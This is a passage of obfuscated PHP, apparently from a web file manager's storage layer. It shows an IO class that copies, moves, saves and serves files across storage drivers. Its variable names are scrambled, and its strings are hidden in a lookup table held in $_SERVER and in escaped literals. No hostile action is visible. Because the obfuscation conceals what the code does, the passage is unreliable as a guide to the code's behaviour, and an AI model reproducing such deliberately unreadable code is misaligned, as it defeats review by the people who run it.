($Ú¿ºš…Š[$Ô‘úÏæ[57]] == $Ô‘úÏæ[91]) { $ŸŒÜ‰‘ = $Ú¿ºš…Š[$Ô‘úÏæ[32]]; } $ğÑ°³¢ = $Ú¿ºš…Š[$Ô‘úÏæ[33]]; if ($ğÑ°³¢ == $Ô‘úÏæ[1210] && isset($€ıéøìè[$Ú¿ºš…Š[$Ô‘úÏæ[32]]])) { $ğÑ°³¢ = $Ô‘úÏæ[1211]; } $œ…êÓî¦ = array($Ô‘úÏæ[463] . $Ú¿ºš…Š[$Ô‘úÏæ[32]] . $Ô‘úÏæ[463], _get($ÚŸè‚à‡, $ğÑ°³¢, $ğÑ°³¢), $Ú¿ºš…Š[$Ô‘úÏæ[35]] == $Ô‘úÏæ[91] ? $Ô‘úÏæ[1199] : $Ô‘úÏæ[1212] . $Ú¿ºš…Š[$Ô‘úÏæ[56]], $Ú¿ºš…Š[$Ô‘úÏæ[57]] == $Ô‘úÏæ[91] ? $Ô‘úÏæ[1213] : $Ô‘úÏæ[12]); $…ÔÇôŒà[] = trim(implode($Ô‘úÏæ[53], $œ…êÓî¦)); } foreach ($€ıéøìè as $Á°Ï¹Í¥ => $–»Ò„€ä) { if ($Á°Ï¹Í¥ == $Ô‘úÏæ[1188]) { $‡Ù¢ê¿¡ = $Æâ³‡¥ê = $Ô‘úÏæ[1214] . $ŸŒÜ‰‘ . $Ô‘úÏæ[1215]; } else { $‡Ù¢ê¿¡ = (stripos($Á°Ï¹Í¥, $Ô‘úÏæ[11]) ? $Ô‘úÏæ[1216] : $Ô‘úÏæ[12]) . ($Ô‘úÏæ[1217] . $Á°Ï¹Í¥ . $Ô‘úÏæ[1218] . $–»Ò„€ä); } $…ÔÇôŒà[] = $‡Ù¢ê¿¡; } if ($ŸŒÜ‰‘ && !$Æâ³‡¥ê) { $…ÔÇôŒà = array_merge(array($Ô‘úÏæ[1214] . $ŸŒÜ‰‘ . $Ô‘úÏæ[1215]), $…ÔÇôŒà); } $§œà†ù = array($Ô‘úÏæ[1219] . $ÂÕãş’© . $Ô‘úÏæ[1220], $Ô‘úÏæ[1221] . $ÂÕãş’© . $Ô‘úÏæ[1222], implode($Ô‘úÏæ[50] . PHP_EOL, $…ÔÇôŒà), $Ô‘úÏæ[1223]); $ï‰ƒç÷¢ = implode(PHP_EOL, $§œà†ù); if ($¤Ê«°À && $¤Ê«°À == $Ô‘úÏæ[872]) { return $ï‰ƒç÷¢; } $æõ¾¬ùô = array($Ô‘úÏæ[872] => $ï‰ƒç÷¢, $Ô‘úÏæ[13] => $İ›ç®€²); return $¤Ê«°À ? $æõ¾¬ùô[$¤Ê«°À] : $æõ¾¬ùô; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÜôÛØËÆ, $´¯÷ü¥) { $ÖÉ´á‘ =& $_SERVER[Š—Â“œÔ]; $±ß…öª = $´¯÷ü¥; $GLOBALS[$ÖÉ´á‘[1224]] = $ÖÉ´á‘[1225] . $ÜôÛØËÆ; Hook::trigger($ÖÉ´á‘[1225] . $ÜôÛØËÆ . $ÖÉ´á‘[1226], $±ß…öª); $‰Âş—ö¯ = self::driverMake($´¯÷ü¥[0]); if (!$‰Âş—ö¯) { return !1; } if (method_exists($‰Âş—ö¯, $ÜôÛØËÆ)) { $¥ş¸»¾à = @call_user_func_array(array($‰Âş—ö¯, $ÜôÛØËÆ), $´¯÷ü¥); } else { if (method_exists($‰Âş—ö¯, $ÖÉ´á‘[1227])) { $¥ş¸»¾à = @call_user_func_array(array($‰Âş—ö¯, $ÜôÛØËÆ), $´¯÷ü¥); } else { if (method_exists(self, $ÜôÛØËÆ)) { $¥ş¸»¾à = @call_user_func_array(array(self, $ÜôÛØËÆ), $´¯÷ü¥); } else { $¥ş¸»¾à = call_user_func_array(array(parent, $ÜôÛØËÆ), $´¯÷ü¥); } } } Hook::trigger($ÖÉ´á‘[1225] . $ÜôÛØËÆ . $ÖÉ´á‘[1228], $±ß…öª, $¥ş¸»¾à); return $¥ş¸»¾à; } public static function init($ò™Ù±…ä) { return self::driverMake($ò™Ù±…ä); } public static function copy($Üø×÷¼˜, $Å¥òıÄ´, $è…¤Åêò = false, $Æ ­á—¼ = false) { return self::copyMoveStart($Üø×÷¼˜, $Å¥òıÄ´, $è…¤Åêò, $_SERVER[Š—Â“œÔ][623], $Æ ­á—¼); } public static function move($ÄßÜã„¾, $ÜÜ¯› Ğ, $¼Ä›È­¾ = false, $ß•œ¶”î = false) { return self::copyMoveStart($ÄßÜã„¾, $ÜÜ¯› Ğ, $¼Ä›È­¾, $_SERVER[Š—Â“œÔ][625], $ß•œ¶”î); } public static function copyMoveChildren($Êş»Ì»‘, $¬½—äÚÃ, $ºûŸä¦¾ = "\143\157\x70\171", $›¤¨†” = REPEAT_REPLACE) { $İ­¿İ™¯ =& $_SERVER[Š—Â“œÔ]; $§©Ïæ¬ = $Êş»Ì»‘; $Ğïºˆæ… = self::driverMake($Êş»Ì»‘); $ÙâË–Ò¡ = $Ğïºˆæ…->listPath($Êş»Ì»‘, !0); $ÄîìÈ»È = array_merge($ÙâË–Ò¡[$İ­¿İ™¯[86]], $ÙâË–Ò¡[$İ­¿İ™¯[85]]); foreach ($ÄîìÈ»È as $Ç“îÙû²) { self::copyMoveStart($Ç“îÙû²[$İ­¿İ™¯[87]], $¬½—äÚÃ, $›¤¨†”, $ºûŸä¦¾, !1); } if ($ºûŸä¦¾ == $İ­¿İ™¯[625]) { self::remove($§©Ïæ¬); } } private static function copyMoveStart($àëÌõéÂ, $Î‰¶‚ª÷, $óœæóÌ, $½Û´Ø¥ä, $Ï¥áô¾ì) { $åÀ×îÑ³ =& $_SERVER[Š—Â“œÔ]; $êñ»¶ı¤ = array($àëÌõéÂ, $Î‰¶‚ª÷, $óœæóÌ, $Ï¥áô¾ì); Hook::trigger($åÀ×îÑ³[1225] . $½Û´Ø¥ä . $åÀ×îÑ³[1226], $êñ»¶ı¤); $ôŸÂ÷çì = self::copyMove($àëÌõéÂ, $Î‰¶‚ª÷, $óœæóÌ, $½Û´Ø¥ä, $Ï¥áô¾ì); Hook::trigger($åÀ×îÑ³[1225] . $½Û´Ø¥ä . $åÀ×îÑ³[1228], $êñ»¶ı¤, $ôŸÂ÷çì); return $ôŸÂ÷çì; } public static function saveFile($©›ÑÑËî, $³Øóúí², $Ä…ŒÑ”Ë = true) { $÷«ŒË¿¸ =& $_SERVER[Š—Â“œÔ]; $Î³¤®×ç = self::info($³Øóúí²); $ÄİĞšú = self::driverMake($©›ÑÑËî); $Ôå«îÆ¢ = self::driverMake($³Øóúí²); $àä£š œ = !1; if ($Ôå«îÆ¢->pathParse[$÷«ŒË¿¸[1229]]) { $àä£š œ = $Ôå«îÆ¢; $Ş¦ÓØí = $Ôå«îÆ¢->pathParse[$÷«ŒË¿¸[1229]]; $Ôå«îÆ¢ = self::driverMake($Ş¦ÓØí); } if ($ÄİĞšú->pathParse[$÷«ŒË¿¸[1229]]) { $Şå±ÓÏ¿ = $ÄİĞšú->pathParse[$÷«ŒË¿¸[1229]]; $ÄİĞšú = self::driverMake($Şå±ÓÏ¿); } $şõÍüÖ› = $Ôå«îÆ¢->pathFather($³Øóúí²); $ß‰ÂÀ±Ğ = !0; if (!$Ä…ŒÑ”Ë && self::driverIsSame($ÄİĞšú, $Ôå«îÆ¢)) { $ß‰ÂÀ±Ğ = !1; } $öïÅ¯Ğ = self::copyFile($ÄİĞšú, $©›ÑÑËî, $Ôå«îÆ¢, $şõÍüÖ›, $Î³¤®×ç[$÷«ŒË¿¸[32]], $ß‰ÂÀ±Ğ); if ($àä£š œ) { $öïÅ¯Ğ = $àä£š œ->getPathOuter($öïÅ¯Ğ); } return $öïÅ¯Ğ; } private static function copyMove($ûôÍÅªü, $›å„œÔ©, $²Ôâ›È, $åäü¾¤•, $Ş¸¼·Í = false) { $¶·µ›® =& $_SERVER[Š—Â“œÔ]; if (!$ûôÍÅªü || $ûôÍÅªü == $¶·µ›®[8] || !$›å„œÔ©) { return !1; } ignore_timeout(); $‚ú»ê•é = self::driverMake($ûôÍÅªü); $áŸ˜¨ÖÄ = self::driverMake($›å„œÔ©); $³Éäô—« = $åäü¾¤• == $¶·µ›®[625]; $ôµ´Üï¿ = !1; if ($áŸ˜¨ÖÄ->pathParse[$¶·µ›®[1229]]) { $ôµ´Üï¿ = $áŸ˜¨ÖÄ; $›å„œÔ© = $áŸ˜¨ÖÄ->pathParse[$¶·µ›®[1229]]; $áŸ˜¨ÖÄ = self::driverMake($›å„œÔ©); } if ($‚ú»ê•é->pathParse[$¶·µ›®[1229]]) { $ûôÍÅªü = $‚ú»ê•é->pathParse[$¶·µ›®[1229]]; $‚ú»ê•é = self::driverMake($ûôÍÅªü); } self::check($‚ú»ê•é, $ûôÍÅªü, $áŸ˜¨ÖÄ, $›å„œÔ©); Hook::trigger($¶·µ›®[1230], $‚ú»ê•é, $ûôÍÅªü, $áŸ˜¨ÖÄ, $›å„œÔ©); $û¾£Ø‹Š = self::driverIsSame($‚ú»ê•é, $áŸ˜¨ÖÄ); if ($û¾£Ø‹Š) { if ($åäü¾¤• == $¶·µ›®[625] && !method_exists($áŸ˜¨ÖÄ, $¶·µ›®[1231]) && trim($›å„œÔ©, $¶·µ›®[8]) == trim($áŸ˜¨ÖÄ->pathFather($ûôÍÅªü), $¶·µ›®[8])) { if ($‚ú»ê•é->pathThis($ûôÍÅªü) != $Ş¸¼·Í && !$‚ú»ê•é->isOsDriver()) { return $‚ú»ê•é->rename($ûôÍÅªü, $Ş¸¼·Í); } return $áŸ˜¨ÖÄ->getPathOuter($ûôÍÅªü); } if (method_exists($áŸ˜¨ÖÄ, $åäü¾¤•)) { return $áŸ˜¨ÖÄ->{$åäü¾¤•}($ûôÍÅªü, $›å„œÔ©, $²Ôâ›È, $Ş¸¼·Í); } } if ($û¾£Ø‹Š && $åäü¾¤• == $¶·µ›®[625] && $áŸ˜¨ÖÄ->getType() == $¶·µ›®[109]) { $…ÍİÀÍ = $áŸ˜¨ÖÄ->movePath($ûôÍÅªü, $›å„œÔ©, $Ş¸¼·Í); if ($…ÍİÀÍ) { return $…ÍİÀÍ; } } $úĞŠèóö = $‚ú»ê•é->isFile($ûôÍÅªü); if (!$úĞŠèóö && $áŸ˜¨ÖÄ->getType() == $¶·µ›®[824] && $‚ú»ê•é->getType() == $¶·µ›®[109]) { $…ÍİÀÍ = $áŸ˜¨ÖÄ->copyFolderFromIO($‚ú»ê•é, $ûôÍÅªü, $›å„œÔ©, $²Ôâ›È, $³Éäô—«, $Ş¸¼·Í); } else { $…ÍİÀÍ = self::copyPath($‚ú»ê•é, $ûôÍÅªü, $áŸ˜¨ÖÄ, $›å„œÔ©, $²Ôâ›È, $³Éäô—«, $úĞŠèóö, $Ş¸¼·Í); } if ($…ÍİÀÍ && $³Éäô—«) { $‚ú»ê•é->remove($ûôÍÅªü); } if ($ôµ´Üï¿) { $…ÍİÀÍ = $ôµ´Üï¿->getPathOuter($…ÍİÀÍ); } return $…ÍİÀÍ; } private static function check($ÃàÜà£Ï, $±£ãÌñÚ, $¡ç‡ˆî–, &$˜üÉ íÆ) { $¶Ú¦óÂ† =& $_SERVER[Š—Â“œÔ]; if (self::driverIsSame($ÃàÜà£Ï, $¡ç‡ˆî–) && $ÃàÜà£Ï->isFolder($±£ãÌñÚ) && $ÃàÜà£Ï->isParentOf($±£ãÌñÚ, $˜üÉ íÆ)) { show_json(LNG($¶Ú¦óÂ†[1232]), !1); } if (!$ÃàÜà£Ï->exist($±£ãÌñÚ)) { show_json(LNG($¶Ú¦óÂ†[108]), !1); } } private static function copyPath($ÎÃ„ ³ì, $²Üî¹ı¼, $ïš›‚’Û, $ü„‰ï´ã, $¢™İî¬æ, $ç ö, $Çú©³‰İ, $í›“…¼ø = false, $ø«É”í¤ = true) { $€¤ƒˆé =& $_SERVER[Š—Â“œÔ]; $ÕÌÓÁİ½ = empty($í›“…¼ø) && $í›“…¼ø !== $€¤ƒˆé[230] ? $ÎÃ„ ³ì->pathThis($²Üî¹ı¼) : $í›“…¼ø; if ($¢™İî¬æ) { $¶µª¸ù¿ = $ïš›‚’Û->fileNameExist($ü„‰ï´ã, $ÕÌÓÁİ½); $Ø’…Â€ = $ÕÌÓÁİ½; $ÕÌÓÁİ½ = $ïš›‚’Û->fileNameAuto($ü„‰ï´ã, $ÕÌÓÁİ½, $¢™İî¬æ, !$Çú©³‰İ); if (!$¶µª¸ù¿ || $Ø’…Â€ != $ÕÌÓÁİ½) { $¢™İî¬æ = !1; } if ($ø«É”í¤ && !$¢™İî¬æ) { $ïš›‚’Û->_data[$€¤ƒˆé[1233]] = !0; } } if ($Çú©³‰İ) { return self::copyFile($ÎÃ„ ³ì, $²Üî¹ı¼, $ïš›‚’Û, $ü„‰ï´ã, $ÕÌÓÁİ½, $ç ö); } if ($¢™İî¬æ == REPEAT_RENAME_FOLDER) { $¢™İî¬æ = !1; } $£–ó“ÀÔ = rtrim($ü„‰ï´ã, $€¤ƒˆé[8]) . $€¤ƒˆé[8] . $ÕÌÓÁİ½; $¢Ğ»‚Ëİ = $ïš›‚’Û->mkdir($ïš›‚’Û->getPath($£–ó“ÀÔ), $¢™İî¬æ); $ü„‰ï´ã = $ïš›‚’Û->getPathInner($¢Ğ»‚Ëİ); $ÑÀş£Ù¹ = $ÎÃ„ ³ì->listPath($²Üî¹ı¼, !0); $ÑÀş£Ù¹ = is_array($ÑÀş£Ù¹) ? $ÑÀş£Ù¹ : array($€¤ƒˆé[86] => array(), $€¤ƒˆé[85] => array()); $ı†ØÏ²ø = array_merge($ÑÀş£Ù¹[$€¤ƒˆé[86]], $ÑÀş£Ù¹[$€¤ƒˆé[85]]); foreach ($ı†ØÏ²ø as $«ìÆ½‚“) { $áŞôˆ  = $«ìÆ½‚“[$€¤ƒˆé[33]] == $€¤ƒˆé[232]; $²Üî¹ı¼ = $ÎÃ„ ³ì->getPathInner($«ìÆ½‚“[$€¤ƒˆé[87]]); $¸Š¼›£ = self::copyPath($ÎÃ„ ³ì, $²Üî¹ı¼, $ïš›‚’Û, $ü„‰ï´ã, $¢™İî¬æ, $ç ö, $áŞôˆ , !1, !1); if (!$¸Š¼›£) { IO::errorTips($€¤ƒˆé[1234] . $²Üî¹ı¼ . $€¤ƒˆé[73] . $ü„‰ï´ã); } } self::copyMoveKeepInfo($ÎÃ„ ³ì, $²Üî¹ı¼, $¢Ğ»‚Ëİ); return $¢Ğ»‚Ëİ; } private static function copyFile($ªâ™æë, $Æ«ä®îé, $ğñˆĞ», $ˆëü¤–æ, $öÒùŞİ, $ÙÈ÷©£¸) { $äô£µ½Ğ =& $_SERVER[Š—Â“œÔ]; $ˆëü¤–æ = $ğñˆĞ»->getPath(rtrim($ˆëü¤–æ, $äô£µ½Ğ[8]) . $äô£µ½Ğ[8] . $öÒùŞİ); $•ê®ûÒÈ = $äô£µ½Ğ[1235] . time() . rand_string(5); Hook::trigger($äô£µ½Ğ[1236], $ªâ™æë, $Æ«ä®îé, $ğñˆĞ», $ˆëü¤–æ, $öÒùŞİ, $•ê®ûÒÈ); if (self::driverIsSame($ªâ™æë, $ğñˆĞ»)) { if ($ÙÈ÷©£¸) { $–Š‹¿¨ = $ğñˆĞ»->moveFile($Æ«ä®îé, $ˆëü¤–æ); } else { $–Š‹¿¨ = $ğñˆĞ»->copyFile($Æ«ä®îé, $ˆëü¤–æ); } Hook::trigger($äô£µ½Ğ[1237], $ªâ™æë, $Æ«ä®îé, $ğñˆĞ», $ˆëü¤–æ, $öÒùŞİ, $–Š‹¿¨); self::copyMoveKeepInfo($ªâ™æë, $Æ«ä®îé, $–Š‹¿¨); return $–Š‹¿¨; } $“Ú–Íğí = TEMP_FILES; if ($GLOBALS[$äô£µ½Ğ[6]][$äô£µ½Ğ[92]][$äô£µ½Ğ[864]]) { $“Ú–Íğí = $GLOBALS[$äô£µ½Ğ[6]][$äô£µ½Ğ[92]][$äô£µ½Ğ[864]]; } $ªìîóö¼ = $“Ú–Íğí; mk_dir($ªìîóö¼); $¦ˆï¢Ää = $ªìîóö¼ . $•ê®ûÒÈ; $à–™ğÁÆ = $¦ˆï¢Ää; $¦ˆï¢Ää = $ªâ™æë->download($Æ«ä®îé, $¦ˆï¢Ää); $¦ˆï¢Ää = $ªâ™æë->iconvApp($¦ˆï¢Ää); if (substr($¦ˆï¢Ää, strlen($“Ú–Íğí)) == $“Ú–Íğí) { $ÙÈ÷©£¸ = !0; } $–Š‹¿¨ = $ğñˆĞ»->upload($ˆëü¤–æ, $¦ˆï¢Ää, $ÙÈ÷©£¸); self::remove($à–™ğÁÆ); Hook::trigger($äô£µ½Ğ[1237], $ªâ™æë, $Æ«ä®îé, $ğñˆĞ», $ˆëü¤–æ, $öÒùŞİ, $–Š‹¿¨); self::copyMoveKeepInfo($ªâ™æë, $Æ«ä®îé, $–Š‹¿¨); return $–Š‹¿¨; } private static function copyMoveKeepInfo($œö›•¿Â, $öÌğùÅÀ, $»ß¯Õë) { if (!$»ß¯Õë) { return; } $¯ÍëŞƒ• = $œö›•¿Â->info($öÌğùÅÀ); if (!is_array($¯ÍëŞƒ•)) { return; } IO::setModifyTime($»ß¯Õë, $¯ÍëŞƒ•[$_SERVER[Š—Â“œÔ][88]]); } public static function pathFather($ƒö¥µÔâ) { $¤Ù…³Ê = IO::init($ƒö¥µÔâ); $ÌûìÈ¡ç = $¤Ù…³Ê->pathFather($¤Ù…³Ê->path); return $¤Ù…³Ê->getPathOuter($ÌûìÈ¡ç); } public static function fileOut($®Íßµ²Ù, $ÒÚÊş¥Á = false, $¢«Şï‡ = false, $È¡ÜÎÜ = '') { $ôŞ»Ï³« = self::driverMake($®Íßµ²Ù); if ($ôŞ»Ï³«->isFileOutServer()) { return $ôŞ»Ï³«->fileOutServer($®Íßµ²Ù, $ÒÚÊş¥Á, $¢«Şï‡, $È¡ÜÎÜ); } return $ôŞ»Ï³«->fileOut($®Íßµ²Ù, $ÒÚÊş¥Á, $¢«Şï‡, $È¡ÜÎÜ); } public static function fileOutImage($›‰¯•«à, $÷š°á’Ç = 250) { $şä¬ÂĞ = array(250, 600, 1200, 2000, 3000, 5000); for ($ÈåŞâæş = 0; $ÈåŞâæş < count($şä¬ÂĞ); $ÈåŞâæş++) { if ($ÈåŞâæş == 0 && $÷š°á’Ç <= $şä¬ÂĞ[$ÈåŞâæş]) { $÷š°á’Ç = $şä¬ÂĞ[$ÈåŞâæş]; break; } else { if ($÷š°á’Ç > $şä¬ÂĞ[$ÈåŞâæş - 1] && $÷š°á’Ç <= $şä¬ÂĞ[$ÈåŞâæş]) { $÷š°á’Ç = $şä¬ÂĞ[$ÈåŞâæş]; break; } else { if ($ÈåŞâæş == count($şä¬ÂĞ) - 1 && $÷š°á’Ç > $şä¬ÂĞ[$ÈåŞâæş]) { $÷š°á’Ç = $şä¬ÂĞ[$ÈåŞâæş]; break; } } } } $€Ä¡¿â = self::driverMake($›‰¯•«à); if ($€Ä¡¿â->isFileOutServer()) { return $€Ä¡¿â->fileOutImageServer($›‰¯•«à, $÷š°á’Ç); } return $€Ä¡¿â->fileOutImage($›‰¯•«à, $÷š°á’Ç); } private static function driverIsSame($óİøÏ£á, $˜Ñ¸Çğî) { $’ÀÍ³Ç´ =& $_SERVER[Š—Â“œÔ]; $Î¡ ƒğ» = $óİøÏ£á->getType(); $™ù…€¸ = $˜Ñ¸Çğî->getType(); if ($Î¡ ƒğ» != $™ù…€¸) { return !1; } if ($Î¡ ƒğ» == $’ÀÍ³Ç´[824]) { return !0; } if ($Î¡ ƒğ» == $’ÀÍ³Ç´[109]) { return !0; } if ($óİøÏ£á->pathDriver == $˜Ñ¸Çğî->pathDriver) { return !0; } return !1; } public static function copyUpdate($¥‚’ Ñ—, $ì×­÷ŠÊ) { $”¾³Ÿ¶¢ =& $_SERVER[Š—Â“œÔ]; if (!IO::exist($¥‚’ Ñ—)) { return !1; } if (!IO::exist($ì×­÷ŠÊ)) { IO::mkdir($ì×­÷ŠÊ); } $Û·Ê­–Ô = array_to_keyvalue(self::listAllSimple($¥‚’ Ñ—), $”¾³Ÿ¶¢[87]); $Î´œ¹ƒó = array_to_keyvalue(self::listAllSimple($ì×­÷ŠÊ), $”¾³Ÿ¶¢[87]); $¤¹áƒÁ§ = array(); $£‰ºŠÒ = array(); foreach ($Û·Ê­–Ô as $ñş‚á©¹ => $Æ¾¡±±à) { if (isset($Î´œ¹ƒó[$ñş‚á©¹])) { if ($Æ¾¡±±à[$”¾³Ÿ¶¢[78]] == 1) { continue; } if ($Î´œ¹ƒó[$ñş‚á©¹][$”¾³Ÿ¶¢[79]] == $Æ¾¡±±à[$”¾³Ÿ¶¢[79]]) { continue; } } if ($Æ¾¡±±à[$”¾³Ÿ¶¢[78]] == 1) { $£‰ºŠÒ[] = $ì×­÷ŠÊ . $”¾³Ÿ¶¢[8] . trim($ñş‚á©¹, $”¾³Ÿ¶¢[8]); continue; } $šÅÈâÒÛ = strstr(trim($ñş‚á©¹, $”¾³Ÿ¶¢[8]), $”¾³Ÿ¶¢[8]) ? get_path_father($ñş‚á©¹) : $”¾³Ÿ¶¢[12]; $¤¹áƒÁ§[] = array($”¾³Ÿ¶¢[1238] => $Æ¾¡±±à[$”¾³Ÿ¶¢[89]], $”¾³Ÿ¶¢[1239] => rtrim($ì×­÷ŠÊ, $”¾³Ÿ¶¢[8]) . $”¾³Ÿ¶¢[8] . $šÅÈâÒÛ, $”¾³Ÿ¶¢[1240] => $Æ¾¡±±à); } $¸¹üÈà = array($”¾³Ÿ¶¢[232] => $¤¹áƒÁ§, $”¾³Ÿ¶¢[78] => $£‰ºŠÒ); Hook::trigger($”¾³Ÿ¶¢[1241], $¥‚’ Ñ—, $ì×­÷ŠÊ, $¸¹üÈà); foreach ($£‰ºŠÒ as $Æ¾¡±±à) { IO::mkdir($Æ¾¡±±à); } foreach ($¤¹áƒÁ§ as $Æ¾¡±±à) { IO::copy($Æ¾¡±±à[$”¾³Ÿ¶¢[1238]], $Æ¾¡±±à[$”¾³Ÿ¶¢[1239]], REPEAT_REPLACE); } } public static function fileSubstr($ş½¹ƒ, $ÛÔ¦§ëê, $²ÊÈˆ×È = false) { $ İŞ³¦ =& $_SERVER[Š—Â“œÔ]; $–•ÅƒŸò = self::driverMake($ş½¹ƒ); $¥õ®§œ‘ = $–•ÅƒŸò->size($ş½¹ƒ); $Äó­÷åÔ = $ÛÔ¦§ëê; $Ğìõ = $²ÊÈˆ×È; if ($ÛÔ¦§ëê < 0) { $ÛÔ¦§ëê = $¥õ®§œ‘ + $ÛÔ¦§ëê; } if ($²ÊÈˆ×È === !1) { $²ÊÈˆ×È = $¥õ®§œ‘ - $ÛÔ¦§ëê; } if ($ÛÔ¦§ëê + $²ÊÈˆ×È > $¥õ®§œ‘) { $²ÊÈˆ×È = $¥õ®§œ‘ - $ÛÔ¦§ëê; } if (!$¥õ®§œ‘ && $–•ÅƒŸò->getType() == $ İŞ³¦[109] && !$–•ÅƒŸò->exist($ş½¹ƒ)) { $¬Ÿ„ş¹± = get_path_this($ş½¹ƒ); $´ŞÂü¾ = parse_url_query($¬Ÿ„ş¹±); if (is_array($´ŞÂü¾) && isset($´ŞÂü¾[$ İŞ³¦[32]])) { $¬Ÿ„ş¹± = urldecode($´ŞÂü¾[$ İŞ³¦[32]]); } throw new Exception($ İŞ³¦[1242] . LNG($ İŞ³¦[1243]) . $ İŞ³¦[1040] . clear_html($¬Ÿ„ş¹±) . $ İŞ³¦[12]); } if ($²ÊÈˆ×È <= 0) { return $ İŞ³¦[12]; } if ($ÛÔ¦§ëê < 0 || $ÛÔ¦§ëê >= $¥õ®§œ‘ || $²ÊÈˆ×È > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\x52\145\141\144\x20\x65\x72\x72\x6f\x72\x21\40\163\x74\141\x72\164\x3d{$ÛÔ¦§ëê}\x3b\154\145\156\147\164\x68\75{$²ÊÈˆ×È}\73\x20\163\x69\x7a\x65\75{$¥õ®§œ‘}\73"); } $…ÇüşŞ® = $–•ÅƒŸò->fileSubstr($ş½¹ƒ, $ÛÔ¦§ëê, $²ÊÈˆ×È); if (!$…ÇüşŞ® && $²ÊÈˆ×È && isset($GLOBALS[$ İŞ³¦[1244]])) { throw new Exception($GLOBALS[$ İŞ³¦[1244]][$ İŞ³¦[1245]]); } return $…ÇüşŞ®; } private static function driverMake(&$×üˆÖªò) { $€æìµÔ =& $_SERVER[Š—Â“œÔ]; $·µ¾Øòé = KodIO::parse($×üˆÖªò); if (!self::$driverListSystem) { $¥Ğµ„ø¾ = Model($€æìµÔ[834])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¥Ğµ„ø¾, $€æìµÔ[477]); } if ($·µ¾Øòé[$€æìµÔ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$·µ¾Øòé[$€æìµÔ[477]]]) { throw new Exception($€æìµÔ[1246]); return !1; } $×üˆÖªò = $·µ¾Øòé[$€æìµÔ[1247]]; $£áˆ„Ÿ  = self::driverGet($·µ¾Øòé, $×üˆÖªò); return $£áˆ„Ÿ ; } private static function driverGet($ùÓÔü , &$™Ôİàê“) { $æã™ˆ Ì =& $_SERVER[Š—Â“œÔ]; $áŞÇæ•ö = $ùÓÔü [$æã™ˆ Ì[1248]]; $ù¬ÑÙ¹Ã = $ùÓÔü [$æã™ˆ Ì[477]]; switch ($ùÓÔü [$æã™ˆ Ì[33]]) { case KodIO::KOD_IO: $ù¨“öª = self::$driverListSystem[$ù¬ÑÙ¹Ã]; break; case KodIO::KOD_SOURCE: $™Ôİàê“ = $ù¬ÑÙ¹Ã . $™Ôİàê“; $ù¨“öª = array($æã™ˆ Ì[1249] => $æã™ˆ Ì[1250], $æã™ˆ Ì[6] => $ùÓÔü ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $öÍŞ›´ = $GLOBALS[$æã™ˆ Ì[1251]]; self::$driverListUser = array_to_keyvalue($öÍŞ›´, $æã™ˆ Ì[477]); } $ù¨“öª = self::$driverListUser[$ù¬ÑÙ¹Ã]; break; case KodIO::KOD_SHARE_LINK: $ù¨“öª = array($æã™ˆ Ì[1249] => $æã™ˆ Ì[1252], $æã™ˆ Ì[6] => $ùÓÔü ); $İÕ÷ó´“ = Action($æã™ˆ Ì[1253])->sharePathInfo($ùÓÔü [$æã™ˆ Ì[87]]); $™Ôİàê“ = $İÕ÷ó´“[$æã™ˆ Ì[193]]; if (!$İÕ÷ó´“[$æã™ˆ Ì[193]]) { $á—¶ Œ· = Model($æã™ˆ Ì[669])->getInfo($İÕ÷ó´“[$æã™ˆ Ì[670]]); $™Ôİàê“ = KodIO::clear($á—¶ Œ·[$æã™ˆ Ì[1254]] . $ùÓÔü [$æã™ˆ Ì[1247]]); $ùÓÔü [$æã™ˆ Ì[562]] = $á—¶ Œ·; $ùÓÔü [$æã™ˆ Ì[1229]] = $™Ôİàê“; $ù¨“öª = array($æã™ˆ Ì[1249] => $æã™ˆ Ì[1255], $æã™ˆ Ì[6] => $ùÓÔü ); } break; case KodIO::KOD_SHARE_ITEM: $ù¨“öª = array($æã™ˆ Ì[1249] => $æã™ˆ Ì[1256], $æã™ˆ Ì[6] => $ùÓÔü ); $á—¶ Œ· = Model($æã™ˆ Ì[669])->getInfo($ùÓÔü [$æã™ˆ Ì[477]]); if ($á—¶ Œ·[$æã™ˆ Ì[193]] == $æã™ˆ Ì[230]) { $™Ôİàê“ = KodIO::clear($á—¶ Œ·[$æã™ˆ Ì[1254]] . $ùÓÔü [$æã™ˆ Ì[1247]]); $ùÓÔü [$æã™ˆ Ì[562]] = $á—¶ Œ·; $ùÓÔü [$æã™ˆ Ì[1229]] = $™Ôİàê“; $ù¨“öª = array($æã™ˆ Ì[1249] => $æã™ˆ Ì[1257], $æã™ˆ Ì[6] => $ùÓÔü ); } else { if (!$™Ôİàê“) { $™Ôİàê“ = $á—¶ Œ·[$æã™ˆ Ì[193]]; } } break; default: $™Ôİàê“ = $ùÓÔü [$æã™ˆ Ì[87]]; $ù¨“öª = array($æã™ˆ Ì[1249] => $æã™ˆ Ì[1258]); break; } $×ù’´ù¤ = $ùÓÔü [$æã™ˆ Ì[87]]; if (!isset(self::$driverCache[$×ù’´ù¤])) { $·½Ü²Â› = strtolower($ù¨“öª[$æã™ˆ Ì[98]]); $”Ï¼¥¤´ = $GLOBALS[$æã™ˆ Ì[6]][$æã™ˆ Ì[92]][$æã™ˆ Ì[893]]; $ÆÜæÜ¶° = $æã™ˆ Ì[77] . (isset($”Ï¼¥¤´[$·½Ü²Â›]) ? $”Ï¼¥¤´[$·½Ü²Â›] : ucfirst($·½Ü²Â›)); if (!class_exists($ÆÜæÜ¶°)) { show_json("{$ÆÜæÜ¶°}\40\x6e\x6f\164\x20\x65\x78\x69\163\x74\163\x21", !1); } $İÚÑ„ËÇ = isset($ù¨“öª[$æã™ˆ Ì[6]]) ? $ù¨“öª[$æã™ˆ Ì[6]] : !1; self::$driverCache[$×ù’´ù¤] = new $ÆÜæÜ¶°($İÚÑ„ËÇ); } $£½¦®š = self::$driverCache[$×ù’´ù¤]; $£½¦®š->pathDriver = $áŞÇæ•ö; $£½¦®š->pathBase = $æã™ˆ Ì[12]; if (isset($ù¨“öª[$æã™ˆ Ì[6]][$æã™ˆ Ì[1259]])) { $£½¦®š->pathBase = rtrim($ù¨“öª[$æã™ˆ Ì[6]][$æã™ˆ Ì[1259]], $æã™ˆ Ì[8]) . $æã™ˆ Ì[8]; $™Ôİàê“ = $£½¦®š->pathBase . ltrim($™Ôİàê“, $æã™ˆ Ì[8]); } $™Ôİàê“ = 